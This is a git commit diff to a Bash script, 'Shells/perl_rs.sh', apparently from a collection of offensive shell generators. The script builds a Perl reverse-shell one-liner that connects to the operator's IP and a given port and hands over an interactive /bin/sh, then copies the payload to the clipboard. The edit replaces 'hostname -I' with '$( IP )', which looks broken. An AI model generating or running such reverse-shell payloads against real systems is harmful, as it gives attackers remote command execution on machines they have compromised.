4573c63df0be40b79aca3babdb32e25264fee570
neogeo56 <54796086+neogeo56@users.noreply.github.com>
2019-12-10 10:24:20 -0600

    Update perl_rs.sh

--- Shells/perl_rs.sh
+++ Shells/perl_rs.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-IP=$( hostname -I );
+IP=$( IP );
 New_IP=$( echo -n $IP );
 echo "perl -e 'use Socket;\$i=\"$New_IP\";\$p=$1;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
 echo "perl -e 'use Socket;\$i=\"$New_IP\";\$p=$1;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | clip;
